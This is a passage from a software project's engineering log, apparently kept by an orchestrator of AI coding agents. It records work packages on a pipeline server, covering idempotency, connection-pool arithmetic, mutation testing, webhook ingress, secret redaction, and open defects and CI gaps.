belong in the floor `pipeline/runtime.ts` already documented; `ROLE=all` goes 8 → 10 against a shipped
default of 10), and `StartRuntimeOptions.pipeline` gains `| null` — a **labelled seam**, the only way
left to start `apps/server` as an incomplete consumer, kept because `sweepReadiness`'s two gates would
otherwise have no end-to-end test at all. `uncomposed.e2e.test.ts` is renamed `composition.e2e.test.ts`
and now holds both branches.

**What this work package did *not* close, measured.** The **composition** of the idempotency store is
asserted by nothing — the adapter has a contract suite against the fake and against PostgreSQL, and
deleting the line in `pipeline.ts` leaves every tier green, because no shipped pipeline action carries an
`IdempotencyPlan` (`slack/digest.ts` is the only one in the repository and Slack is not in the shipped
registry). Said at the line rather than left to be assumed. ~~Open.~~ **Closed at WP-15d**, which gave the
two ticket writes a plan keyed by the wake-up and re-delivers one through the instance's own `Jobs`
adapter: deleting the line now fails
`test/e2e/pipeline/outbound-shape.e2e.test.ts` › *"replays the ticket write out of the idempotency store this instance composed"*
— measured, the `replayed` row never appears. And **`ClaudeRunner` is still Q52**:
`unavailableClaudeRunner()` **throws** `RunnerUnavailableError` rather than returning a fabricated failed
outcome, because a fabricated outcome would make the interpreter transition on a verdict for a run that
never happened — the fail-open direction of rule 20. A task that reaches an agent stage therefore stops
there, in its own job, loudly. Nothing reaches one today: there is no ingress until WP-15c.

**WP-15b review round 1 (REQUEST_CHANGES) — two majors, both about something the WP created.**

1. **The idempotency store's documented invariant was asserted by nothing.** `on conflict do nothing`
   keeps the *first* result, and flipping it to `do update set result = excluded.result` left the
   integration file 18/18 and the contract file 11/11 green — while the **fake's** opposite behaviour
   (a second `put` throws) *was* asserted. Rule 1 inverted: the fake was held to a promise the real
   adapter was not, so the real one could drift into being the kinder of the two. Closed by a
   Postgres-only case (it cannot go in the shared suite: the two implementations legitimately differ
   here, and the fake's stricter answer is the allowed direction) — *"answers a raced second put with
   the result the first one stored"*, which dies under the mutation.
2. **The pool floor did not count the connection this WP nests inside a dispatch.** `CONNECTIONS_PER_DISPATCH`
   is 2 — the dispatcher's transaction plus the handler's — and an audit write opens a **third**,
   because three handlers call a provider from inside `context.scope.tx` (`saga.ts:215` after
   `store.tasks.insert`, `workpad.ts:168`, and the status mapping beside it) and
   `createPostgresIntegrationAuditLog` takes its own `pool.connect()`. Checked rather than accepted:
   the two **job workers** make their provider calls *outside* their transactions
   (`jobs.ts:194`, `jobs.ts:306`), so that term stays flat at 2 while the audit term is
   proportional. Floor for `ROLE=all`, N=1: `(2+1)×1+1 + 2 + 2 + 2 + 1 = **11**`, so the shipped
   default rose 10 → **13** (the same two connections of slack the old default carried over its
   floor of 8). `config.ts` now reads `CONNECTIONS_PER_DISPATCH` instead of a literal `2` (rule 41),
   and the arithmetic is corrected in all four places that state it: `config.ts`,
   `UndersizedPoolError`'s message, `pipeline/runtime.ts`'s docblock and `.env.example` (rule 63).
   A new named test asserts the **shape** rather than the value — *"scales the audit connection with
   dispatch concurrency rather than reserving one"*, which a flat reservation fails. **No exhaustion
   measurement exists and none was taken**: generating load on this machine is forbidden (rule 66)
   and a margin quoted without its load is not a number (rule 64). This is worst-case arithmetic,
   which is what a start-up refusal should rest on.
3. **The FK residual was honest and incomplete.** technical/03 now says that every reader
   `LEFT JOIN`s and must render a row whose task or project is missing — an inner join hides exactly
   the rows an audit exists for, and "the audit shows nothing" then reads like "nothing happened".
   It is in the data model rather than only in the migration because **no reader exists today**, so
   the whole cost falls on whoever builds `GET /api/org/audit`.
4. Minor: `test/e2e/support/instance.ts`'s docblock still claimed an instance runs without a pipeline
   when nothing supplies a runner — false by this WP's own change.
5. Nit, pre-existing and **wider than reported**: `slack/threads.ts` and `provider.ts` both claimed
   `post_task_thread` "carries an `IdempotencyPlan`". It does not — `send({ action:
   'post_task_thread' })` attaches none, and the plan in `slack-executor.contract.test.ts` is built
   **by the test**. So the durable half is *available and unused*, and a restarted process really
   does open a second thread. Both docblocks now say that. Rule 44 on a claim that was really a
   statement about a fixture.

**Mutation checks.** Nine guards, each with the named test that dies: `redaction_count` written verbatim
(unit *"writes every column the entry carries…"*, integration *"stores a non-zero redaction count…"* and
*"records a non-zero count, and no credential…"*); the conflict retry (unit *"re-reads the sequence and
retries…"*, *"gives up after the bound…"*, integration *"retries against the real guard…"*); the
in-transaction append (integration *"leaves no row behind when the append loses the stream sequence"* and
two more); the migration's `drop default`; the dropped foreign key; the unconditional composition (e2e
*"reports /readyz ok on ROLE=all…"* and *"names the agent runner as the one collaborator…"*); the composed
audit log replaced by a no-op (e2e *"writes an integration_actions row per provider call…"*); and
`unavailableClaudeRunner` turned into a null object (unit *"throws, naming the stage and the open
question…"*) — which had **no** test until the mutation was run.

## Discovered work (not in plan)

- **The composition of the `IdempotencyStore` has no test (WP-15b).** The adapter is held by a shared
  contract suite against both implementations; the *line in `apps/server/src/pipeline.ts`* that builds it
  is not, and deleting it leaves every tier green — because no shipped pipeline action carries an
  `IdempotencyPlan`. The work package that gives one to a pipeline action (a comment marker id is
  technical/06's own example) owns the assertion. Stated at the line in `pipeline.ts`.
- **`apps/server` composes a pipeline whose agent stages cannot run (WP-15b, Q52).** `/readyz` is now
  `ok` on `ROLE=all` and a task that reaches an agent stage fails in its `stage.execute` job with
  `RunnerUnavailableError`. Nothing reaches one until WP-15c builds the ingress, so the exposure is
  today zero — but whoever lands the ingress before the runner transport should decide whether a task
  parked on a throwing job needs a state of its own, or whether the job's failure record is enough.
- **`integration.action.performed` / `.failed` are `unconsumed` and now actually produced.** Every
  outbound provider call appends one to the integration's stream, and the dispatcher completes each as
  "no handler matched" — correct today, and WP-19's audit/health projections are what consume them.
  `readPendingDispatch` returns at most one event per stream, so a busy integration's audit events
  dispatch one per sweep cycle; nothing has measured that at volume.

- ~~**Nothing loads a project's integration bindings**~~ — **CLOSED at WP-15a**
  (`packages/integrations/src/bindings/loader.ts`, composed in `apps/server/src/pipeline.ts`). The secret
  resolution it names had no code at all: `secrets.ciphertext` was read by nothing, so WP-15a also built the
  `SecretStore` port and its envelope adapter. Original entry, for the record:
- **Nothing loads a project's integration bindings, so the pipeline cannot be wired into
  `apps/server` yet (WP-15).** `createPipelineRuntime` takes `PipelineIntegrations` — a git binding
  and a task-management binding, each an adapter plus its `IntegrationRef` — and the platform has
  no code that reads `integrations` / project bindings out of the database and builds them. Every
  provider adapter, the executor and the pipeline are ready; the composition root has nothing to
  hand them. It is a small use case (`bindingsFor(projectId)`) plus the secret resolution TD-020
  describes, and it blocks the first *real* instance rather than any test.
- ~~**`ProviderCreateInput.secrets` is not connected to `exactSecretRedactor`**~~ — **CLOSED at WP-15a**:
  the loader names every resolved credential `<provider>:<integrationId>:<field>` and composes it into the
  `redactor` it passes to `create`, so a composition root cannot hand a provider a secret the redactor never
  learns. Original entry:
- **`ProviderCreateInput.secrets` is not connected to `exactSecretRedactor` (found at WP-15,
  untouched).** A composition root can hand a provider a secret the redactor never learns. The
  redaction fix on `main` closed the *walk*; this is the wiring. Q55 is the harder half of the same
  question (a run-scoped credential cannot be in a binding-time redactor at all).
- **The CI gate returns failing job **names**, not the log excerpt product/04 S4 asks for (WP-15).**
  `getJobLog` is the call, and its redaction obligation is Q55's. When Q55 is decided, the gate
  should fetch the failing job's log through the per-run redactor and put the error block in the
  return reason — it is the difference between "test:unit failed" and a developer stage that knows
  what to fix. Round 2 wrote the cut into **product/04 S4** itself and pinned the `detail` string in
  `gates.test.ts`, so the change is a failing test rather than a silent improvement.

- **Jira's adapter wraps its own calls in `IntegrationActionExecutor` and the pipeline wraps them again
  (found at WP-15a, filed rather than fixed).** WP-09's GitLab adapter deliberately keeps the executor
  *outside* itself — its docblock says so, citing standing rule 14 — and `pipeline/integrations.ts` wraps
  every call the pipeline makes. WP-08's Jira adapter takes an `executor` and wraps its own. Composing both
  in one registry therefore produces **two `integration_actions` rows and two rate-limit acquisitions for
  one ticket write**. Nothing is unsafe: the outer executor refuses a shadow mutation before the inner one
  is reached, and the inner `actionContext` is `fixedActionContext('normal')` for exactly that reason. The
  fix is Jira adopting GitLab's shape, which is an adapter change with its own contract suite, so WP-15a
  registered it and wrote the duplication down at
  `packages/integrations/src/bindings/shipped-registry.ts` instead of quietly shipping it.
- **`IntegrationAuditLog` and `IdempotencyStore` have no Postgres adapter, and `integration_actions` is
  missing three columns for one (found at WP-15a).** BD-003's whole outbound-audit claim rests on a port
  WP-07 shipped and nothing implements. Migration 0007's table has no `project_id`, `redaction_count` or
  `attempts`, all three of which `IntegrationActionEntry` carries, so the work is a numbered migration plus
  an adapter that appends the `integration.action.performed` / `.failed` events in the same transaction —
  which needs stream-sequence allocation outside a saga, the thing `NormalisedEvent` stops short of on
  purpose. Until it exists, `apps/server` starts **no pipeline** unless a caller supplies an audit log, and
  says so in a warning naming the gap.
- **No webhook ingress exists, so nothing in production emits `ticket.matched` (found at WP-15a round
  2).** `apps/server/src/routes/` has no `/webhooks/<provider>/<integrationId>` endpoint, which
  technical/06 § "Inbound" specifies, and no polling fallback either. WP-15a made an instance able to
  *act* on a ticket event and able to *keep* one it cannot act on; nothing yet produces one outside a
  test. The inbox table is unwritten for the same reason (rule 70's digest note already depends on it).
- ~~**The shipped GitLab and Jira registrations are reached by no tier through the loader**~~ —
  **CLOSED at WP-15a round 2**, cheaply, at the *integration* tier rather than with another e2e:
  `test/integration/secrets/bindings.integration.test.ts` seeds real `integrations` rows and sealed
  `secrets`, then runs the production loader with `createPipelineProviderRegistry` and builds both
  shipped adapters. No provider I/O happens and none is stubbed — `create` parses and constructs — so
  it costs about a second. The gap it closes is the one nothing else covered: the **merge of a real
  `integrations.config` row with a real decrypted secret into a real provider's strict schema**, which
  is where a column rename or a `secretFields` typo lands. A second case asserts a row missing
  `base_url` is a refusal rather than `git: null` (rule 20 through the shipped schema).
- **The binding loader has no cache, deliberately, and nothing has measured whether it needs one
  (WP-15a).** Every provider call re-reads the project's bindings and rebuilds the adapters, because Q55
  makes the redactor per-call and because a cache would have to be invalidated by a settings change, a
  credential rotation and a rate-limit budget that lives on the adapter — and would hold decrypted
  credentials in memory for as long as it held an entry. The place to put one, when a measurement asks for
  it, is `BindingRepository`; the reasoning is in `bindings/loader.ts`.
- **`emitted-secrets.test.ts`'s provider list is still hand-written, and WP-15a now leans on it (WP-15a).**
  The loader's binding-half redactor is defence in depth *because* that file covers only Jira and GitLab —
  deleting the half leaves every test green but the one seam written for it. Making the file's provider
  list a sweep of `providers/` would turn a declared rule-22 layer into a genuinely redundant one, which is
  the better end state.

- **An unlabelled `ws-<run-id>` volume: the e2e half is fixed, the production half is a decision nobody
  has taken (WP-14 round 3).** Standing rule 60 has the measurement. What is *done* here is the harness:
  its cleanup now also sweeps `ws-<uuid>` by exact name, so a `verify:e2e` run leaves nothing. What is
  **not** done, deliberately, is production — `purgeExpired` lists by `role=workspace` and
  `retentionDecision` answers `keep`/`unlabelled` for ever, so the shape a sweep cannot see is the shape
  reclamation refuses to touch. That is safe today (the provider labels the volume before any container
  names it) and it is not free later. Whoever wants it reclaimed needs a decision — an `agentic`-owned
  name prefix reserved by policy, or an orphan report an operator acts on — **not a widened filter**, which
  would remove volumes that are not ours.

- **`loki/index.test.ts`'s million-iteration divergence census is a timeout flake under a full parallel
  run.** It failed once inside `pnpm run -s verify` during the round-2 redaction fix and passed on the next
  three runs; standalone the whole file takes **1.67 s** across three runs, and the test is deterministic by
  construction (a fixed `BigInt` base, no clock, no randomness), so it cannot fail by *value* — which leaves
  the 5 s default timeout under 163 parallel files as the only candidate. Standing rule 2: it is a hardware
  assertion wearing a correctness one. Whoever touches that file next should give the census an explicit
  timeout (`PROPERTY_TEST_TIMEOUT_MS`'s neighbour) or shrink the sample and state the confidence, rather than
  leave a red build that reproduces on nobody's machine. Not touched here: it is outside this fix.

- **Orchestrator parallelism has a ceiling, and it is lower than it looks.** Running three implementers plus
  reviews drove this 14-core host to load average ~143. Two consequences: WP-02's model tests, which measure
  ~1.2s idle, measured 4.2-7.5s under load and *timed out locally* against the old 5s default — the same
  defect CI had already caught; and WP-05's timing evidence had to be gathered deliberately under load to
  mean anything. **Rule for the rest of this session: at most two or three concurrent agents, and never
  judge a timing-sensitive suite while implementers are running.** The 30s property-test cap is sized for
  exactly this, which is the argument for the cap rather than against it.

- **OPEN-QUESTIONS numbering collides when WPs run in parallel.** WP-05's worktree branched from `ca1ae06`,
  before WP-02 landed Q36 (RBAC map) and Q37 (command block-list), so it filed its working-day-calendar
  question as **Q36** too. Renumbered to **Q38** at merge (done). *Convention from here on:* an implementer must
  re-check the highest existing question number against `main` immediately before writing, and the
  orchestrator renumbers at merge when parallel worktrees collide. The same hazard applies to migration
  file numbers (`0001`-`0009` today) — two parallel WPs both adding `0010` would both pass in isolation and
  collide on merge.
- **pg-boss `persistQueueStats` is pinned off deliberately (WP-05).** `platform_app` has USAGE but not
  CREATE on schema `pgboss` and owns nothing there. Enabled, stats collection works all day and then fails
  at UTC midnight on the background error channel — a failure mode that would look random. Turning it on
  requires a new migration granting CREATE; not done, and the constraint is asserted by an integration test.

- **ci-fix (WP-02, run 34363371997): a property test that only fails on CI.**
  `packages/domain/src/aggregates/task.model.test.ts:531` times out at Vitest's 5000ms default on GitHub's
  2-core runner while passing locally — 795 tests passed, this one failed, every other job green. The gate
  is only as good as its slowest runner, so the fix is an explicit generous timeout for property and
  model-based tests (not a nudged number) plus an audit of the other property tests in `packages/domain`
  for the same fragility. Folded into WP-02a's worktree rather than a fourth worktree, as a separate commit.
  **Lesson for later WPs: a test that passes locally by a hair is not green.** Property tests need headroom
  and a pinned `numRuns`, and CI is the authority, not this machine.

- **CI: the `commitlint` and `dco` jobs never run.** Both are `pull_request`-only, but this session commits
  directly to `main` and never opens a PR, so both report `skipped` on every push (verified on run
  34360466443). WP-00's "DCO check" acceptance criterion is met on paper only. Fix: add `push` to their
  triggers (checking `BASE..HEAD` or the pushed range). Low risk today — lefthook runs commitlint locally
  and every commit so far carries a `Signed-off-by` — but it is an unverified gate. **Do this at the
  5-WP checkpoint.**

- **WP-00 non-blocking, deferred (reviewer round 3):** `CLAUDE.md:20` documents `pnpm eval`, which has no
  `package.json` script yet — add a stub or drop the line at **WP-17**. `CLAUDE.md:15` lists `docker/` and
  `schemas/` which do not exist yet (target layout; `schemas/` lands in WP-01, `docker/` in WP-22).
  `pnpm secrets:scan` (`dir .`) honours `.gitignore`, so a stray local `.env` is invisible to it — CI's
  full-history scan is the real gate.
- **Renovate rule needed** for the `ghcr.io/gitleaks/gitleaks` digest pin in `scripts/gitleaks.mjs`, so the
  pinned image is bumped like any other dependency.
- **Import-boundary lint** enforcing `domain ← application ← infrastructure/integrations ← apps` does not
  exist; the dependency rule currently holds only by absence of cross-package imports. Add it in WP-01/02
  when the first workspace dependency lands.

- ~~**Agent role files carried the broken command:** `.claude/agents/{implementer,reviewer}.md` told
  every subagent to run `pnpm -s verify`.~~ Fixed by the orchestrator in round 3 (all three role
  files, including `architect.md`). The implementer was right to leave harness configuration alone.
- ~~**Verification contract wording (WP-00):** the protocol doc said `pnpm -s verify`.~~ Corrected by
  the orchestrator in round 2.
- **CI workflows still to add (technical/11):** `integration.yml`, `evals.yml`, `nightly-llm.yml`,
  `image.yml`, `base-image.yml`, `release.yml`, `codeql.yml`, `secrets-scan.yml` (weekly trufflehog),
  `mutation.yml`; plus `.github/ISSUE_TEMPLATE/*`, `CODEOWNERS`, `dependabot.yml` (security only),
  `CODE_OF_CONDUCT.md`, `THIRD_PARTY_NOTICES.md`, and the `actionlint`/`hadolint`/`zizmor` steps in
  the lint job (hadolint needs `docker/` from WP-22). Rulesets, required checks and the merge queue
  are GitHub-side configuration a human has to apply.
- **WP-05 ↔ WP-04 reconciliation, decided by the orchestrator at WP-04 review round 1 and
  implemented.** `event_dispatch` plus the sweep stay the **single queue of record**; pg-boss does
  **not** get a `dispatch(event)` job. Two queues would disagree after a crash, and pg-boss has no
  per-stream serialisation, so ordering would collapse onto `hasEarlierPending` refusing and
  rescheduling — a retry storm where head-of-line blocking belongs. WP-05 replaces only the *timer*:
  `OutboxWorker` takes a `DrainScheduler` (`schedule(name, intervalMs, run)`, job name
  `OUTBOX_SWEEP_JOB = 'events.outbox.sweep'`, implementations should coalesce overlapping runs —
  pg-boss `singleton`), and the `NOTIFY` subscription keeps waking `drain()` for latency. The seam is
  defined in `packages/application/src/events/outbox.ts` because WP-05's `Jobs` port was not on
  WP-04's base; WP-05 implements `DrainScheduler` over it. Scheduled concurrency must respect the
  pool invariant below. `PARTITION_MAINTENANCE_JOB` (WP-03) is still WP-05's to schedule.
- **Dispatch has no dead-letter state (WP-04).** An event whose handler keeps failing is retried with
  exponential backoff for ever and blocks its stream. `handler_executions.status = 'failed'` and the
  `event_dispatch` backlog are the only signals; WP-06 should surface them (`/metrics`, an ops view)
  and WP-15 should decide what a permanently poisoned event does to its task.
- **`events.id` and `cause_event_id` are not in technical/03** (added by WP-04's migration 0010; the
  event catalogue in technical/02 has always required them). The data-model document should be
  amended to match.
- **The two `*.model.test.ts` property suites are close to the 5 s default timeout.** WP-02's
  `task.model` and `run.model` `fc.commands` tests take ~3 s each in isolation and time out when the
  machine is loaded (observed at WP-04 with several worktrees running at once: 9–10 s, red; the same
  commit is green when the machine is idle). Nothing about them is wrong — the budget is. Either give
  the `unit` project a `testTimeout` above the default or lower their `numRuns`; a suite that is red
  only under load is a suite CI will call flaky.
- **Biome `noConsole`** is not enabled yet; turn it on for server code when pino lands (WP-06).
- **Licence allow-list check** (`pnpm licenses`, TD-017) is not wired; it belongs with WP-23's
  `THIRD_PARTY_NOTICES.md`.
- **Agent registry:** in session 1 the roles in `.claude/agents/{implementer,reviewer,architect}.md` were not exposed as `subagent_type` values, and the orchestrator worked around it with `general-purpose` subagents. **In session 2 they are registered** (`implementer`, `reviewer`, `architect` appear as agent types with the tool sets their role files imply), so they are spawned directly — and still told, as their first instruction, to read and obey their role file, because the registration carries the tool list but not the protocol.

### WP-15d — the provider calls left the handlers' transactions, and what that turned out to cost

**The shape.** The three sites (intake branch check, workpad render, ticket status) now *decide* in the
handler and *call* from a `pipeline.outbound` job enqueued through `HandlerContext.afterCommit`. One queue,
one worker, `standard` policy, three duties. `JOB_QUEUES.pipelineOutbound` carries why the policy is
`standard` and not `stately`: a coalesced wake-up would drop the **blocker brief**, which is the one thing a
render cannot re-derive from the task row.

**The measurement, before and after** (criterion 5; shipped defaults — `APP_DB_POOL_MAX=13`,
`APP_DISPATCH_MAX_CONCURRENCY=1` — on the e2e tier, provider latency stated, load average stated):

| quantity | before | after |
|---|---|---|
| N=10 concurrent intakes, 250 ms per git read (500 ms per intake): unrelated event dispatched after | **5 464 ms** | **63 ms** |
| the same run: 10 task rows exist after | 5 465 ms | 5 555 ms |
| one git read held open indefinitely: was an unrelated event dispatched while it was in flight? | **no** (20 s budget exhausted) | **yes** |

Load average 4.09 / 3.76 (before) and 6.05 / 5.96 (after), 1-minute, taken at the start and end of each run
on the 14-core machine with the user's own containers up (rule 64). The first row is the defect: with
`APP_DISPATCH_MAX_CONCURRENCY` at its shipped 1, the single dispatch slot sat inside `pipeline.intake`
waiting for an HTTP response, so **every other project's events waited too** — that is the answer to "does
one project's slow provider delay dispatch for every other project", and it is *yes* before and *no* after.
The second row is the honest residual: the outbound worker is serial at concurrency 1, so the *throughput*
of provider work is unchanged — what moved is that it no longer happens inside the dispatcher. The third row
ships as `test/e2e/pipeline/outbound-shape.e2e.test.ts`, a liveness assertion rather than a duration
(rule 2): the fake provider's read is held open by a promise the test resolves.

**The pool arithmetic, recomputed rather than reverted** (criterion 4). `auditPerDispatch` is **0** —
no handler's transaction contains a provider call or an audit write any more — and `pipeline` is **3**, one
per job worker (the new outbound worker is the third). At the shipped defaults the floor is `2×1+1+2+3+2+1`
= **11**, the same number WP-15b reached by a different route (`3N+8` against `2N+9`); they agree at N=1 and
diverge above it — 17 against 20 at N=4. `.env.example` keeps `APP_DB_POOL_MAX=13`, which is that floor plus
two of slack. Stated in all four places (`config.ts`'s `POOL_RESERVATIONS` preamble, `UndersizedPoolError`'s
message, `pipeline/runtime.ts`'s docblock, `.env.example`) because an arithmetic claim cannot be maintained
from inside one file (rule 63).

**A defect the move created, found by running it, and fixed.** The first `verify:e2e` after the move failed
twice: a bug ticket finished `done` with `cost_actual` **2.40** after seven runs of 0.40, and a feature
ticket sat at `ci_gate` until the 90 s settle gave up. One cause. `TaskRepository.save` writes the **whole**
row, and the workpad's "remember where the comment lives" write now happens in a job that runs *beside* the
stage executor's transactions — so it put back the cost, the state and the stage as they were when the job
started. A read-modify-write across a concurrency boundary that did not exist before. The fix is a narrow
port method, `tasks.saveWorkpad(tx, taskId, ref)`, one column, with the contract-suite case that pins it
("writes the workpad without writing anything else, so a concurrent cost survives"). **The general shape is
still there and is filed below**: every other `save` is a whole-row write, and the stage executor and the
saga handlers can still race.

**Mutation checks** (rules 3, 67 — every guard, by a named assertion). Each of the five kills exactly one
test, and the other guards' tests stay green, so they are five guards and not one guard bounded five times
(rule 41):

| mutation | the named test that dies |
|---|---|
| drop the refusal in `integrationsForProject` | *refuses to resolve a project's bindings inside a transaction, and resolves outside one* |
| drop the refusal in `read` | *refuses a provider read whose bindings were resolved before the transaction opened* |
| drop the refusal in `mutate` | *refuses a provider mutation whose bindings were resolved before the transaction opened* |
| `EventBus` stops marking the handler's transaction | *fails the next handler that reaches for a provider, rather than the production pool* |
| `createPipelineRuntime` stops wrapping its `UnitOfWork` | *marks the job path's transactions too, so a job that tried would be refused as well* |
| `POOL_RESERVATIONS.auditPerDispatch` back to 1 | *costs two connections per added dispatch, not three, because no handler calls a provider* (and two more) |

**How the mutations were applied, because it is not the obvious way and the next agent will hit it.** This
session's environment **reverts an out-of-band write to any file the Edit tool has touched** — verified on
five files: a `python3` rewrite of `integrations.ts` reported `len 15535 → 15480` and re-read `15535` one
second later, and an Edit-tool deletion of the same line was restored too. The harness above therefore
mutates a **copy** (`cp integrations.ts zzmutant.ts`, mutate the copy, run a copy of the refusal tests
against it) and deletes both afterwards. The copy is calibrated first — unmutated, it passes 3/3 (rule 21).

**Decisions and assumptions, each of which a reviewer may reverse.**
- **The status the ticket moves to is decided by the handler and carried in the job payload; the workpad is
  re-rendered from the task row when the job fires.** They are different on purpose. A workpad is a
  *picture*, so rendering from committed state is strictly better; a transition is a *movement*, and a job
  that re-derived it would send a task that moved twice to its final status twice and never show the one in
  between. Re-deriving it was measured first: it turned one existing test's `['In Refinement']` into
  `['In Refinement', 'In Refinement']`, which is the shape of the regression.
- **`recordMergeRequest` no longer records which provider and repository path the merge request is on.**
  Learning that means resolving the project's bindings — a pool borrow and a credential decryption — and it
  runs inside the handler's transaction. `gitReads` fills both in from the binding that is live when the ref
  is *used*, which is also more correct: a re-bound project would otherwise be addressed at its old account.
  Nothing reads the stored fields (the UI reads `mr_ref.url`), and the git adapter already falls back to the
  binding's own project.
- **The intake handler writes nothing at all.** The task is created by the job, in the transaction that
  admits or escalates it, so there is no window in which a half-intaken task row exists for the scheduler to
  start behind the branch check's back. The cost, **corrected at review round 1 because the first version of
  this sentence named a mitigation that does not exist** (rule 44): a crash between that commit and the
  enqueue leaves the ticket without a task, and **nothing re-emits it**. There is no poller in this build
  (the only mention is a comment on `ports/integrations/task-management.ts`), and WP-15c's plan row accepts a
  re-delivery being deduplicated on `inbox(provider, delivery_id)`, so the same webhook twice performs
  nothing twice. It is also **unlogged and cannot be logged at the loss point**: the process that would write
  the line is the one that died, and `event-bus.ts` logs only a callback that *threw*. The detectable form is
  a query — a matched ticket with no task row — which is the ingress's to own, and is being routed to the
  refiner as a WP-15c acceptance criterion rather than built here.
- **The two ticket writes carry an `IdempotencyPlan` keyed by the cause event** (`<action>:<platform
  id>:<cause event id>`), which is the first thing in this repository to make the executor's
  `idempotencyStore` load-bearing — the assertion the WP-15b "Discovered work" entry asked for. A key stable
  across events would be worse than none: the ticket would show the task's first state for ever. Both halves
  are asserted (*replays instead of writing again* / *writes again for the next event*).
- **Ordering between handler 110 and handler 120 is now the queue's, not TD-005's.** Both enqueue onto one
  queue served by one worker, so the order normally holds, but two jobs created microseconds apart are
  ordered by pg-boss. `pipeline.e2e.test.ts` now waits for **both** consequences before asserting either
  (rule 76), and the harness docblock says no test may infer one from the other.

**A risk this change adds to the e2e tier, stated rather than discovered later.** Every e2e now waits on
pg-boss for its *first* step — the task is created by the intake job, so a starved worker means "the task is
not created" rather than "the task stopped at stage N". Four full `verify:e2e` runs: green, green, **nine
failures**, green. The bad one started at load average **10.3**, immediately after a `verify` whose vitest
workers were still winding down, and every failure in it was a job that never ran in *any* instance
(including the two that existed before this work package). The good runs were at 5.8 and 8.1. It is one more
job hop in front of a tier that already needed pg-boss for every stage, and it is worth knowing before
somebody calls it a flake in this file's code: the machine is the variable that moved.

**Discovered work (not done here).**
- **`ProjectSettingsPort.forProject` is a `projects` query on a connection borrowed *inside* the handler's
  transaction** (`apps/server/src/pipeline.ts`), at `planApprovalGate` and `schedulerHandler`. It is a local
  read, not a call held across a third party's latency — it contends, it cannot stall, because every other
  borrower releases without waiting on a dispatch — so it is not in the floor. The honest fix is for the
  port to take the caller's transaction; today the claim "a dispatch holds two connections" is true of what
  it *holds* and not of what it transiently borrows.
- **Every other `tasks.save` is a whole-row write** and the stage executor, the saga handlers and the
  outbound job can still interleave. The workpad's case is fixed because WP-15d created it; the class is
  not. A narrow write per writer, or optimistic concurrency on the row, is a work package of its own — and
  it now has a reproduction (see above).
- **A static `import pg from 'pg'` placed before the harness import in an e2e file makes
  `createEventing` throw `EventBus is not a constructor`** — a module-graph cycle that only bites at a
  particular import order. Worked around in a throwaway file with `await import('pg')`; nothing in the
  repository does it today, and nothing stops the next file from doing it.

## Milestone notes

See "Checkpoint 1" above.

### WP-15c — the door, and two files this session could not write

**The headline sentence is no longer true.** `POST /webhooks/:provider/:integrationId` exists, and
`test/e2e/pipeline/webhook-ingress.e2e.test.ts` › *"starts a ticket nothing seeded and drives it to
task.completed"* is the criterion: bytes go to a real socket, and the Fastify route, the raw-body
parser, the binding loader, the provider's own signature check, `inbox(provider, delivery_id)`, the
event append, the outbox worker, pg-boss and every stage are production code. No `publish`, no
seeded row.

**The shape, and the one deviation from technical/06.** verify → key → normalise → **one
transaction** that writes the `inbox` row and appends the events it produced. technical/06 said
"enqueues normalisation as a job … all work is asynchronous"; that shape has backlog **20**'s defect
in its *unrecoverable* form — the row is written, `Jobs.enqueue` does not join that transaction
(TD-004), and a crash between them records a delivery as performed that never was, which a
redelivery cannot fix because the row it would be deduplicated against is the one the crash left.
technical/06 is amended beside the sentence, with the cost stated (the 2xx waits for normalisation:
pure on Jira, at most one discussions read on a GitLab note) and the shape to adopt if that ever
gets expensive named — a sweep of `inbox_unprocessed_idx`, where the row *is* the queue.

**Three decisions worth re-reading before changing them.**
1. **An unverified delivery writes no `inbox` row.** A row would let anyone who can address the
   endpoint **poison a dedup key**: plant the id a genuine future delivery will carry, and that
   delivery is silently taken for a redelivery and dropped. It is refused (401) and audited as one
   `integration_actions` row with `direction = 'in'` **and no event** — an event there would let an
   unauthenticated caller grow the append-only log one row per request.
2. **Authenticity is the account's question; meaning is the project's.** `verify` and the dedup key
   come from `integrations.config` (the URL names the account, the credential is the account's, and
   `inbox` has no project column); `normalise` runs once per **binding**, with `bindings.config`
   merged over it. Merging them would make a project's pick-up-rule override change which deliveries
   the *account* accepts.
3. **A delivery nobody can key is received, not refused** (202, `accepted: false`). Both shipped
   providers refuse to key exactly the hook kinds their normaliser ignores anyway, and a vendor that
   keeps receiving errors disables the webhook — rule 20.

**The ruling's four items, and where each is asserted.** `delivery_id` is the adapter's redacted
plaintext key (no digest; `delivery-key-redaction.test.ts` is unchanged). `headers`/`payload` are
`redactJson`-redacted after `verify` and after the key — `webhook-ingress.integration.test.ts` ›
*"is accepted, and the header carrying the binding’s own secret is redacted on the row"* is the live
GitLab **legacy-token** assertion the row asked for, including `redaction_count >= 1`. The verdict is
persisted (`inbox.verified`, migration **0014**). `redaction_count` is the **sum over the row's three
redactions** — headers, payload, ignore detail — and the honest limit is stated at the code: the
adapter's own count on the key is **not observable from the endpoint**, because the port returns a
string, which is why the count cannot be "the key's plus the row's".

**Backlog 20 is closed and its criterion asserted the way the row asked.**
`pipeline.intake.reconcile` finds matched tickets with no `mode='normal'` task row, older than one
interval, and appends a **new** `ticket.matched` with a system actor — which is also the mark that
bounds it to **one attempt per ticket**, so a permanently failing intake cannot grow the log.
`test/e2e/pipeline/intake-recovery.e2e.test.ts` drops the first `intake_check` enqueue through a
labelled composition seam (`PipelineComposition.jobs`) and shows the ticket still reaches
`task.completed`, with the inbox untouched and one task row. Dropping the enqueue is the same loss as
a crash between the commit and `afterCommit`, and it is deterministic.

**Q52's landing is decided: no new task state (filed as Q59, implemented).** Until this work package
a `runner.start()` that **throws** escaped both of the executor's endings — transaction 1 had already
written the `runs` row, so the run stayed `running` for ever and the task sat at a stage nothing would
move, with the failure visible only in pg-boss. `stage-executor.ts` now fails that run
(`error_during_execution`, zero usage, zero cost) and escalates the task to `needs_human`, in one
transaction. `escalated` already means *a human must act*; a third spelling of "stuck" would need a
migration to an enum the interpreter reads and would be a state no screen, template or query knows.
The reason carries the error's **class name and never its message**, because it reaches
`events.payload` and the blocker brief and the executor holds no redactor. Two costs are in Q59: a
transient start failure now escalates instead of consuming the job's retries, and
`unavailableClaudeRunner` keeps refusing rather than fabricating an outcome (WP-15a's decision
stands — what changed is where the refusal lands).

**`EVENT_CONSUMPTION` is unchanged, deliberately.** This work package introduces no event type and
flips no row: it makes the *producers* live for types already declared. Four it can now produce are
declared `unconsumed` and each names its owner — `ticket.comment.added` (WP-31/WP-24),
`ticket.status.changed` (WP-24), `mr.opened` and `mr.updated` (WP-41) — so they are swept and
